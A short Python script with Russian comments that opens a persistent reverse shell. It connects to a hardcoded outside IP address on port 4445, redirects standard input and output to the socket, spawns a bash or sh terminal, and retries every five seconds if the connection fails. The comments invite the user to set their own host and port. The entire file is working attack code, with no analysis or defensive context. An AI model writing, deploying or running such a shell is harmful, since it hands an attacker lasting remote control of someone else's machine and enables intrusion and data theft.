#!/usr/bin/env python3
import socket, os, pty, time

LHOST = "95.165.8.178"   # <-- поменяй при необходимости
LPORT = 4445             # <-- твой порт
DELAY = 5                # секунды между ретраями

def connect():
    while True:
        try:
            s = socket.create_connection((LHOST, LPORT))
            for fd in (0, 1, 2):
                os.dup2(s.fileno(), fd)
            os.putenv("TERM", "xterm-256color")
            shell = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh"
            pty.spawn(shell)
            s.close()
        except Exception:
            time.sleep(DELAY)

if __name__ == "__main__":
    connect()
